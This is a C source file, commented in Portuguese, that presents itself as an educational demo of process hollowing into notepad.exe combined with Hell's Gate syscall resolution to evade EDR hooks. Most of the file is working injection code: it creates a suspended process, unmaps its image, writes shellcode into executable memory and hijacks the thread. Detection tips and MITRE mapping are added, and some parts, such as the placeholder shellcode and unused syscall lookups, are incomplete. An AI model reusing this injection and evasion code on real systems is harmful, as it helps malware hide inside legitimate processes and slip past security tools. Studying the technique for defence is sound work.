/*
 * hollowHaze - Process Hollowing Educational Demo
 * 
 * PROPÓSITO: Demonstração educacional de Process Hollowing com Hell's Gate
 * AUDIÊNCIA: Pentesters, analistas de malware, equipes de segurança
 * AMBIENTE: Controlado e autorizado apenas
 * 
 * AVISO: Este código é exclusivamente para fins educacionais!
 * 
 * Compilar:
 * gcc -o hollowHaze.exe demo.c -lkernel32 -lntdll -luser32
 * 
 * Executar:
 * .\hollowHaze.exe
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>

// Definições necessárias para Hell's Gate
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Estruturas para syscalls
typedef struct _SYSCALL_ENTRY {
    DWORD Hash;
    DWORD Address;
    PVOID SyscallAddress;
    WORD SyscallNumber;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Protótipos NTAPI
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

// Variáveis globais
HMODULE g_hNtdll = NULL;
pNtUnmapViewOfSection g_NtUnmapViewOfSection = NULL;
pNtWriteVirtualMemory g_NtWriteVirtualMemory = NULL;

/*
 * FUNÇÃO: banner
 * PROPÓSITO: Exibir banner do programa
 */
void banner() {
    printf("  _           _ _               _   _               \n");
    printf(" | |__   ___ | | | _____      _| | | | __ _ _______  \n");
    printf(" | '_ \\ / _ \\| | |/ _ \\ \\ /\\ / / |_| |/ _` |_  / _ \\ \n");
    printf(" | | | | (_) | | | (_) \\ V  V /|  _  | (_| |/ /  __/ \n");
    printf(" |_| |_|\\___/|_|_|\\___/ \\_/\\_/ |_| |_|\\__,_/___\\___| \n");
    printf("                                                    \n");
    printf(" Process Hollowing Educational Demo v1.0\n");
    printf(" Para treinamento de pentesters e equipes Blue Team\n");
    printf(" ================================================\n\n");
}

/*
 * FUNÇÃO: djb2_hash
 * PROPÓSITO: Calcular hash DJB2 para Hell's Gate
 * PARÂMETROS: str - string para hash
 * RETORNO: hash da string
 */
DWORD djb2_hash(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

/*
 * FUNÇÃO: find_syscall_number
 * PROPÓSITO: Encontrar número do syscall usando Hell's Gate
 * PARÂMETROS: function_name - nome da função NTAPI
 * RETORNO: número do syscall ou -1 se falhou
 * 
 * EXPLICAÇÃO HELL'S GATE:
 * Esta função implementa a técnica Hell's Gate para encontrar
 * syscalls não-hooked diretamente no NTDLL, evitando detecção
 */
WORD find_syscall_number(const char* function_name) {
    printf("[HELL'S GATE] Buscando syscall: %s\n", function_name);
    
    if (!g_hNtdll) {
        printf("[ERRO] NTDLL não carregado\n");
        return -1;
    }
    
    // Obter endereço da função
    FARPROC func_addr = GetProcAddress(g_hNtdll, function_name);
    if (!func_addr) {
        printf("[ERRO] Função %s não encontrada\n", function_name);
        return -1;
    }
    
    printf("[DEBUG] %s encontrada em: 0x%p\n", function_name, func_addr);
    
    // Verificar se não está hooked
    BYTE* bytes = (BYTE*)func_addr;
    
    // Padrão syscall x64: 4C 8B D1 B8 [syscall_number] 00 00 00 00
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && 
        bytes[2] == 0xD1 && bytes[3] == 0xB8) {
        
        WORD syscall_num = *(WORD*)(bytes + 4);
        printf("[SUCESSO] Syscall não-hooked encontrado: 0x%04x\n", syscall_num);
        return syscall_num;
    }
    
    printf("[AVISO] Função pode estar hooked, tentando método alternativo...\n");
    
    // Buscar próxima função não-hooked (implementação simplificada)
    for (int i = 1; i <= 50; i++) {
        BYTE* next_func = bytes + (i * 0x20); // Offset aproximado
        if (next_func[0] == 0x4C && next_func[1] == 0x8B && 
            next_func[2] == 0xD1 && next_func[3] == 0xB8) {
            
            WORD base_syscall = *(WORD*)(next_func + 4);
            WORD estimated = base_syscall - i; // Estimativa
            printf("[INFO] Syscall estimado via Hell's Gate: 0x%04x\n", estimated);
            return estimated;
        }
    }
    
    printf("[FALHA] Não foi possível resolver syscall para %s\n", function_name);
    return -1;
}

/*
 * FUNÇÃO: init_hellsgate
 * PROPÓSITO: Inicializar Hell's Gate e resolver syscalls
 * RETORNO: TRUE se sucesso, FALSE se falhou
 */
BOOL init_hellsgate() {
    printf("[INFO] === INICIALIZANDO HELL'S GATE ===\n");
    
    // Carregar NTDLL
    g_hNtdll = GetModuleHandleA("ntdll.dll");
    if (!g_hNtdll) {
        printf("[ERRO] Falha ao obter handle do NTDLL\n");
        return FALSE;
    }
    
    printf("[SUCESSO] NTDLL carregado: 0x%p\n", g_hNtdll);
    
    // Resolver APIs críticas (método híbrido para demo)
    g_NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        g_hNtdll, "NtUnmapViewOfSection");
    g_NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(
        g_hNtdll, "NtWriteVirtualMemory");
    
    if (!g_NtUnmapViewOfSection || !g_NtWriteVirtualMemory) {
        printf("[ERRO] Falha ao resolver APIs críticas\n");
        return FALSE;
    }
    
    // Demonstrar Hell's Gate para funções específicas
    WORD syscall_unmap = find_syscall_number("NtUnmapViewOfSection");
    WORD syscall_write = find_syscall_number("NtWriteVirtualMemory");
    
    printf("[INFO] Hell's Gate inicializado com sucesso\n");
    printf("       NtUnmapViewOfSection: 0x%04x\n", syscall_unmap);
    printf("       NtWriteVirtualMemory: 0x%04x\n", syscall_write);
    
    return TRUE;
}

/*
 * FUNÇÃO: create_demo_payload
 * PROPÓSITO: Criar payload de demonstração (MessageBox simples)
 * PARÂMETROS: 
 *   payload_size - ponteiro para receber tamanho do payload
 * RETORNO: ponteiro para payload alocado
 */
LPVOID create_demo_payload(SIZE_T* payload_size) {
    printf("[PAYLOAD] Criando payload de demonstração...\n");
    
    // Shellcode x64 para MessageBox "hollowHaze Demo!"
    // Este é um exemplo educacional simplificado
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 40
        0x48, 0x31, 0xC9,                               // xor rcx, rcx (hWnd)
        
        // Carregar string "hollowHaze Demo!" na pilha
        0x48, 0xB8, 0x21, 0x6F, 0x6D, 0x65, 0x44, 0x20, 0x65, 0x7A, // mov rax, "ze D ome!"
        0x50,                                           // push rax
        0x48, 0xB8, 0x68, 0x6F, 0x6C, 0x6C, 0x6F, 0x77, 0x48, 0x61, // mov rax, "aH wolloh"
        0x50,                                           // push rax
        
        0x48, 0x89, 0xE2,                               // mov rdx, rsp (lpText)
        
        // Carregar "Demo" como título
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x6D, 0x65, 0x44, // mov rax, "Demo"
        0x50,                                           // push rax
        0x49, 0x89, 0xE0,                               // mov r8, rsp (lpCaption)
        
        0x4D, 0x31, 0xC9,                               // xor r9, r9 (uType)
        
        // Chamar MessageBoxA (endereço seria resolvido dinamicamente)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA_addr
        0xFF, 0xD0,                                     // call rax
        
        // Limpar stack e retornar
        0x48, 0x83, 0xC4, 0x48,                         // add rsp, 72
        0x48, 0x31, 0xC0,                               // xor rax, rax
        0xC3                                            // ret
    };
    
    *payload_size = sizeof(shellcode);
    
    LPVOID payload = malloc(*payload_size);
    if (!payload) {
        printf("[ERRO] Falha ao alocar payload\n");
        return NULL;
    }
    
    memcpy(payload, shellcode, *payload_size);
    
    printf("[SUCESSO] Payload criado (%zu bytes)\n", *payload_size);
    printf("[INFO] Este payload é apenas demonstrativo\n");
    
    return payload;
}

/*
 * FUNÇÃO: perform_process_hollowing
 * PROPÓSITO: Executar a técnica de Process Hollowing
 * PARÂMETROS:
 *   target_path - caminho do processo alvo
 *   payload - buffer do payload
 *   payload_size - tamanho do payload
 * RETORNO: TRUE se sucesso, FALSE se falhou
 * 
 * EXPLICAÇÃO PROCESS HOLLOWING:
 * 1. Criar processo suspenso
 * 2. Obter contexto e informações da imagem
 * 3. Desmapear imagem original
 * 4. Alocar memória e injetar payload
 * 5. Ajustar contexto para novo entry point
 * 6. Resumir execução
 */
BOOL perform_process_hollowing(LPCWSTR target_path, LPVOID payload, SIZE_T payload_size) {
    printf("\n[INFO] === INICIANDO PROCESS HOLLOWING ===\n");
    printf("[TARGET] %ws\n", target_path);
    
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    
    // ETAPA 1: Criar processo suspenso
    printf("\n[ETAPA 1] Criando processo suspenso...\n");
    if (!CreateProcessW(
        target_path, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi)) {
        
        printf("[ERRO] Falha ao criar processo: %lu\n", GetLastError());
        return FALSE;
    }
    
    printf("[SUCESSO] Processo criado - PID: %lu, TID: %lu\n", 
           pi.dwProcessId, pi.dwThreadId);
    
    // ETAPA 2: Obter contexto do thread
    printf("\n[ETAPA 2] Obtendo contexto do thread...\n");
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[ERRO] Falha ao obter contexto: %lu\n", GetLastError());
        goto cleanup_and_fail;
    }
    
    printf("[DEBUG] RCX (entry point): 0x%llx\n", ctx.Rcx);
    printf("[DEBUG] RDX (image base): 0x%llx\n", ctx.Rdx);
    
    // ETAPA 3: Ler informações da imagem PE
    printf("\n[ETAPA 3] Analisando imagem PE do target...\n");
    IMAGE_DOS_HEADER dos_header;
    SIZE_T bytes_read;
    
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rdx, 
                          &dos_header, sizeof(dos_header), &bytes_read)) {
        printf("[ERRO] Falha ao ler DOS header: %lu\n", GetLastError());
        goto cleanup_and_fail;
    }
    
    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[ERRO] Assinatura DOS inválida\n");
        goto cleanup_and_fail;
    }
    
    IMAGE_NT_HEADERS nt_headers;
    LPVOID nt_headers_addr = (LPVOID)(ctx.Rdx + dos_header.e_lfanew);
    
    if (!ReadProcessMemory(pi.hProcess, nt_headers_addr,
                          &nt_headers, sizeof(nt_headers), &bytes_read)) {
        printf("[ERRO] Falha ao ler NT headers: %lu\n", GetLastError());
        goto cleanup_and_fail;
    }
    
    printf("[DEBUG] Image base: 0x%llx\n", nt_headers.OptionalHeader.ImageBase);
    printf("[DEBUG] Entry point: 0x%lx\n", nt_headers.OptionalHeader.AddressOfEntryPoint);
    printf("[DEBUG] Image size: %lu bytes\n", nt_headers.OptionalHeader.SizeOfImage);
    
    // ETAPA 4: Desmapear imagem original (Hell's Gate!)
    printf("\n[ETAPA 4] Desmapeando imagem original via Hell's Gate...\n");
    
    NTSTATUS status = g_NtUnmapViewOfSection(
        pi.hProcess, 
        (PVOID)nt_headers.OptionalHeader.ImageBase
    );
    
    if (NT_SUCCESS(status)) {
        printf("[SUCESSO] Imagem original desmapeada via NtUnmapViewOfSection\n");
    } else {
        printf("[AVISO] NtUnmapViewOfSection falhou (0x%lx), continuando...\n", status);
    }
    
    // ETAPA 5: Alocar nova memória
    printf("\n[ETAPA 5] Alocando memória para payload...\n");
    
    LPVOID allocated_mem = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt_headers.OptionalHeader.ImageBase,
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!allocated_mem) {
        printf("[ERRO] Falha ao alocar memória: %lu\n", GetLastError());
        
        // Tentar alocar em qualquer lugar
        allocated_mem = VirtualAllocEx(
            pi.hProcess, NULL, payload_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        );
        
        if (!allocated_mem) {
            printf("[ERRO] Falha total na alocação: %lu\n", GetLastError());
            goto cleanup_and_fail;
        }
    }
    
    printf("[SUCESSO] Memória alocada em: 0x%p\n", allocated_mem);
    
    // ETAPA 6: Escrever payload
    printf("\n[ETAPA 6] Escrevendo payload na memória...\n");
    
    SIZE_T bytes_written;
    if (!WriteProcessMemory(pi.hProcess, allocated_mem, 
                           payload, payload_size, &bytes_written)) {
        printf("[ERRO] Falha ao escrever payload: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, allocated_mem, 0, MEM_RELEASE);
        goto cleanup_and_fail;
    }
    
    printf("[SUCESSO] %zu bytes escritos no processo\n", bytes_written);
    
    // ETAPA 7: Ajustar contexto
    printf("\n[ETAPA 7] Ajustando contexto para novo entry point...\n");
    
    // Definir novo entry point
    ctx.Rcx = (DWORD64)allocated_mem;
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[ERRO] Falha ao definir contexto: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, allocated_mem, 0, MEM_RELEASE);
        goto cleanup_and_fail;
    }
    
    printf("[SUCESSO] Contexto ajustado para: 0x%p\n", allocated_mem);
    
    // ETAPA 8: Resumir execução
    printf("\n[ETAPA 8] Resumindo execução do processo hollowed...\n");
    
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[ERRO] Falha ao resumir thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, allocated_mem, 0, MEM_RELEASE);
        goto cleanup_and_fail;
    }
    
    printf("\n[SUCESSO] === PROCESS HOLLOWING CONCLUÍDO ===\n");
    printf("[INFO] Processo %lu agora executa nosso payload\n", pi.dwProcessId);
    printf("[INFO] Verifique no Process Explorer - processo aparenta ser legítimo!\n");
    
    // Aguardar um pouco antes de limpar handles
    Sleep(2000);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
    
cleanup_and_fail:
    if (pi.hThread) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
    }
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    
    return FALSE;
}

/*
 * FUNÇÃO: demonstrate_detection
 * PROPÓSITO: Mostrar como detectar Process Hollowing
 */
void demonstrate_detection() {
    printf("\n=== DEMONSTRAÇÃO DE DETECÇÃO ===\n");
    printf("INDICADORES DE PROCESS HOLLOWING:\n\n");
    
    printf("1. ANÁLISE DE MEMÓRIA:\n");
    printf("   - Seções de memória não-padrão\n");
    printf("   - Regiões executáveis em locais inesperados\n");
    printf("   - Discrepâncias entre imagem em disco vs memória\n\n");
    
    printf("2. MONITORAMENTO COMPORTAMENTAL:\n");
    printf("   - Processos criados suspensos por tempo anormal\n");
    printf("   - Chamadas para NtUnmapViewOfSection\n");
    printf("   - WriteProcessMemory em processos recém-criados\n\n");
    
    printf("3. FERRAMENTAS RECOMENDADAS:\n");
    printf("   - Hollows Hunter: github.com/hasherezade/hollows_hunter\n");
    printf("   - Process Hacker: Análise detalhada de memória\n");
    printf("   - Sysmon: Event ID 25 (Process Image Changed)\n");
    printf("   - WinAPIOverride: Monitor de chamadas de API\n\n");
    
    printf("4. SYSMON CONFIGURATION:\n");
    printf("   <ProcessTampering onmatch=\"include\">\n");
    printf("   <Rule name=\"ProcessHollowing\" groupRelation=\"and\">\n");
    printf("     <Type condition=\"is\">Image replaced</Type>\n");
    printf("   </Rule>\n");
    printf("   </ProcessTampering>\n\n");
    
    printf("5. POWERSHELL DETECTION:\n");
    printf("   Get-Process | Where-Object { $_.MainModule -eq $null }\n");
    printf("   # Processos sem módulo principal podem estar hollowed\n\n");
}

/*
 * FUNÇÃO: show_mitre_mapping
 * PROPÓSITO: Mostrar mapeamento MITRE ATT&CK
 */
void show_mitre_mapping() {
    printf("\n=== MAPEAMENTO MITRE ATT&CK ===\n");
    printf("TECHNIQUE ID: T1055.012\n");
    printf("TECHNIQUE: Process Injection: Process Hollowing\n");
    printf("TACTICS: Defense Evasion, Privilege Escalation\n\n");
    
    printf("SUB-TECHNIQUES RELACIONADAS:\n");
    printf("- T1055.001: Dynamic-link Library Injection\n");
    printf("- T1055.002: Portable Executable Injection\n");
    printf("- T1055.003: Thread Execution Hijacking\n");
    printf("- T1055.004: Asynchronous Procedure Call\n\n");
    
    printf("DETECTION DATA SOURCES:\n");
    printf("- Process: OS API Execution\n");
    printf("- Process: Process Creation\n");
    printf("- Process: Process Modification\n");
    printf("- File: File Modification\n\n");
    
    printf("MITIGATIONS:\n");
    printf("- M1040: Behavior Prevention on Endpoint\n");
    printf("- M1026: Privileged Account Management\n\n");
}

/*
 * FUNÇÃO: main
 * PROPÓSITO: Função principal do hollowHaze
 */
int main(int argc, char* argv[]) {
    banner();
    
    BOOL debug_mode = FALSE;
    
    // Verificar argumentos
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--debug") == 0) {
            debug_mode = TRUE;
            printf("[DEBUG] Modo debug ativado\n\n");
        }
    }
    
    printf("[INFO] Iniciando demonstração educacional de Process Hollowing\n");
    printf("[AVISO] Execute apenas em ambiente controlado e autorizado!\n\n");
    
    // Verificar privilégios
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            if (!elevation.TokenIsElevated) {
                printf("[AVISO] Executando sem privilégios de administrador\n");
                printf("[INFO] Algumas operações podem falhar\n\n");
            }
        }
        CloseHandle(hToken);
    }
    
    // FASE 1: Inicializar Hell's Gate
    if (!init_hellsgate()) {
        printf("[FALHA] Não foi possível inicializar Hell's Gate\n");
        printf("[INFO] Continuando com APIs padrão para demonstração\n");
        // Tentar usar APIs padrão como fallback
        g_hNtdll = GetModuleHandleA("ntdll.dll");
        if (g_hNtdll) {
            g_NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
                g_hNtdll, "NtUnmapViewOfSection");
            g_NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(
                g_hNtdll, "NtWriteVirtualMemory");
            
            if (g_NtUnmapViewOfSection && g_NtWriteVirtualMemory) {
                printf("[INFO] Usando APIs padrão como fallback\n");
            } else {
                printf("[ERRO] Falha total na resolução de APIs\n");
                return -1;
            }
        } else {
            printf("[ERRO] Falha ao obter NTDLL\n");
            return -1;
        }
    }
    
    // FASE 2: Criar payload de demonstração
    printf("\n[INFO] === PREPARANDO PAYLOAD ===\n");
    SIZE_T payload_size;
    LPVOID payload = create_demo_payload(&payload_size);
    
    if (!payload) {
        printf("[FALHA] Não foi possível criar payload\n");
        return -1;
    }
    
    // FASE 3: Executar Process Hollowing
    printf("\n[INFO] === EXECUTANDO PROCESS HOLLOWING ===\n");
    
    // Target: notepad.exe (processo legítimo comum)
    LPCWSTR target_process = L"C:\\Windows\\System32\\notepad.exe";
    
    if (!perform_process_hollowing(target_process, payload, payload_size)) {
        printf("[FALHA] Process Hollowing não foi bem-sucedido\n");
        free(payload);
        return -1;
    }
    
    printf("\n[INFO] === DEMONSTRAÇÃO EDUCACIONAL CONCLUÍDA ===\n");
    
    // FASE 4: Informações educacionais
    if (debug_mode) {
        demonstrate_detection();
        show_mitre_mapping();
    }
    
    // FASE 5: Resumo para pentesters
    printf("\n=== PONTOS-CHAVE PARA PENTESTERS ===\n");
    printf("Hell's Gate evita hooks de EDR/AV usando syscalls diretos\n");
    printf("Process Hollowing mascara execução maliciosa em processo legítimo\n");
    printf("Processo aparenta normal no Task Manager/Process Explorer\n");
    printf("Herda contexto de segurança do processo original\n");
    printf("Dificulta análise forense e atribuição\n\n");
    
    printf("=== CONTRAMEDIDAS BLUE TEAM ===\n");
    printf("Monitorar syscalls diretos (bypass de hooks)\n");
    printf("Detectar processos com imagens desmapeadas\n");
    printf("Análise comportamental de criação de processos suspensos\n");
    printf("Verificação de integridade de processos em runtime\n");
    printf("Logging avançado com Sysmon (Event ID 25)\n\n");
    
    printf("=== FERRAMENTAS RECOMENDADAS ===\n");
    printf("Detecção:\n");
    printf("   - Hollows Hunter: https://github.com/hasherezade/hollows_hunter\n");
    printf("   - Pe-sieve: https://github.com/hasherezade/pe-sieve\n");
    printf("   - Process Hacker: https://processhacker.sourceforge.io/\n");
    printf("   - Volatility: https://www.volatilityfoundation.org/\n\n");
    
    printf("Desenvolvimento:\n");
    printf("   - SysWhispers: https://github.com/jthuraisamy/SysWhispers\n");
    printf("   - Hell's Gate: https://github.com/am0nsec/HellsGate\n");
    printf("   - Sektor7 Courses: https://institute.sektor7.net/\n\n");
    
    printf("=== PRÓXIMOS PASSOS DE APRENDIZADO ===\n");
    printf("Técnicas Avançadas:\n");
    printf("   1. Manual DLL Loading\n");
    printf("   2. PPID Spoofing\n");
    printf("   3. Thread Stack Spoofing\n");
    printf("   4. Argument Spoofing\n");
    printf("   5. Process Doppelgänging\n\n");
    
    printf("Evasões Avançadas:\n");
    printf("   1. Heaven's Gate (x64->x86 syscalls)\n");
    printf("   2. Halos Gate (syscall resolution)\n");
    printf("   3. Tartarus Gate (syscall chaining)\n");
    printf("   4. Direct syscalls via inline assembly\n");
    printf("   5. NTDLL unhooking\n\n");
    
    printf("Análise e Detecção:\n");
    printf("   1. Memory forensics com Volatility\n");
    printf("   2. Behavioral analysis com YARA\n");
    printf("   3. ETW (Event Tracing for Windows)\n");
    printf("   4. Kernel callbacks monitoring\n");
    printf("   5. Hardware-assisted detection\n\n");
    
    // Cleanup
    free(payload);
    
    printf("[INFO] Limpeza concluída. Pressione Enter para sair...\n");
    getchar();
    
    return 0;
}

/*
 * FUNÇÃO: print_educational_notes
 * PROPÓSITO: Imprimir notas educacionais importantes
 */
void print_educational_notes() {
    printf("\n=== NOTAS EDUCACIONAIS IMPORTANTES ===\n");
    
    printf("\nCONTEXTO TÉCNICO:\n");
    printf("Este código demonstra conceitos fundamentais usados por:\n");
    printf("- APT (Advanced Persistent Threats)\n");
    printf("- Malware comercial (Cobalt Strike, Metasploit)\n");
    printf("- Ransomware moderno\n");
    printf("- Trojans bancários\n\n");
    
    printf("VARIAÇÕES NA PRÁTICA:\n");
    printf("- Reflective DLL Loading\n");
    printf("- Module Stomping\n");
    printf("- Thread Hijacking\n");
    printf("- Atom Bombing\n");
    printf("- Process Doppelgänging\n");
    printf("- Process Herpaderping\n\n");
    
    printf("ASPECTOS LEGAIS:\n");
    printf("- Use apenas em sistemas próprios ou autorizados\n");
    printf("- Documente todas as atividades de teste\n");
    printf("- Mantenha escopo limitado ao ambiente controlado\n");
    printf("- Respeite acordos de não-divulgação\n");
    printf("- Considere legislação local sobre hacking ético\n\n");
    
    printf("EVOLUINDO SUAS HABILIDADES:\n");
    printf("1. Implemente variações desta técnica\n");
    printf("2. Desenvolva contramedidas específicas\n");
    printf("3. Teste contra diferentes EDRs\n");
    printf("4. Estude código de malware real (VirusTotal)\n");
    printf("5. Participe de CTFs focados em malware\n");
    printf("6. Contribua para projetos open-source de segurança\n\n");
}

/*
 * ESTRUTURAS AUXILIARES E CONSTANTES
 */

// Hashes para Hell's Gate (DJB2)
#define HASH_NtUnmapViewOfSection    0x858bcb1a
#define HASH_NtWriteVirtualMemory    0x56a2b5f0
#define HASH_NtResumeThread          0x9e570b7f
#define HASH_NtCreateProcess         0x1694056b

// Offsets comuns em diferentes versões do Windows
typedef struct _WINDOWS_VERSION_OFFSETS {
    DWORD BuildNumber;
    DWORD PebLdrDataOffset;
    DWORD InLoadOrderLinksOffset;
    DWORD DllBaseOffset;
    DWORD DllNameOffset;
} WINDOWS_VERSION_OFFSETS;

// Tabela de offsets para diferentes versões
static WINDOWS_VERSION_OFFSETS g_VersionOffsets[] = {
    { 10240, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1507
    { 10586, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1511  
    { 14393, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1607
    { 15063, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1703
    { 16299, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1709
    { 17134, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1803
    { 17763, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1809
    { 18362, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1903
    { 18363, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 1909
    { 19041, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 2004
    { 19042, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 20H2
    { 19043, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 21H1
    { 19044, 0x18, 0x10, 0x30, 0x58 },  // Windows 10 21H2
    { 22000, 0x18, 0x10, 0x30, 0x58 },  // Windows 11 21H2
    { 22621, 0x18, 0x10, 0x30, 0x58 },  // Windows 11 22H2
    { 0, 0, 0, 0, 0 }                   // End marker
};

/*
 * COMENTÁRIOS FINAIS PARA A EQUIPE:
 * 
 * Este código demonstra as técnicas fundamentais de:
 * 1. Hell's Gate para evasão de hooks
 * 2. Process Hollowing para injeção mascarada
 * 
 * Para pentesters iniciantes:
 * - Compile e execute em VM isolada
 * - Use debugger para acompanhar cada etapa
 * - Monitore com Process Monitor/Process Hacker
 * - Teste diferentes targets e payloads
 * 
 * Para desenvolvimento de contramedidas:
 * - Implemente detecção baseada nos indicadores mostrados
 * - Teste eficácia contra este e outros samples
 * - Desenvolva regras YARA específicas
 * - Configure logging adequado
 * 
 * Próximas técnicas a estudar:
 * - Heaven's Gate (WOW64 transitions)
 * - Halos Gate (indirect syscalls)
 * - Thread Stack Spoofing
 * - PPID Spoofing
 * - Manual DLL Loading
 * 
 * Lembre-se: O objetivo é DEFENSIVO através do conhecimento ofensivo!
 */